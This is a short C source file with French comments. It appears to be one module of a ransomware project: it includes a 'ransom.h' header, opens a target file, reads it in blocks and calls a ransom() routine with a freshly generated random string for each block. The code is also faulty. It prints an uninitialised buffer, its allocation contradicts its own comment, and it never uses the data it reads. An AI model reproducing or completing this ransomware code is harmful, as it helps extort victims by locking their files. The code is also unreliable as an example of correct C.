/*# =====================================================================================
#
#       Filename:  obfuscate.c
#
#    Description:  Fonction d'obfuscation qui appel le stockage des logs
#
#        Version:  1.0
#        Created:  19/12/2024
#       Revision:  none
#
#         Author:  David
#   Organization:
#
# =====================================================================================*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <locale.h>
#include "gener.h"
#include "stock.h"
#include "ransom.h"

// Définir le jeu de caractères pour générer une chaîne alphanumérique aléatoire
#define CHARSET "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

char user_id[] = "Toto";

void obfuscateFile(const char *filename)
{
    // Taille d'un bloc
    size_t blockSize = 100;
    char ch;

    FILE *file = fopen(filename, "r+"); // Ouvrir le fichier en mode lecture/écriture
    if (!file)
    {
        fprintf(stderr, "Erreur : Impossible d'ouvrir le fichier %s\n", filename);
        return;
    }

    // Allouer un buffer pour le contenu du fichier

    char *content = (char *)malloc((blockSize) * sizeof(char)); // +1 pour le caractère de fin '\0'
    if (!content)
    {
        fprintf(stderr, "Erreur : Impossible d'allouer de la mémoire.\n");
        fclose(file);
        return;
    }
    printf("%s", content);
    // Lire le contenu du fichier dans le buffer
    size_t bytesRead;
    while ((bytesRead = fread(content, sizeof(char), blockSize, file)) > 0)
    {

        char *randomString = gener(20);
        ransom(randomString);
        free(randomString);
    }

    free(content);

    fclose(file);
}
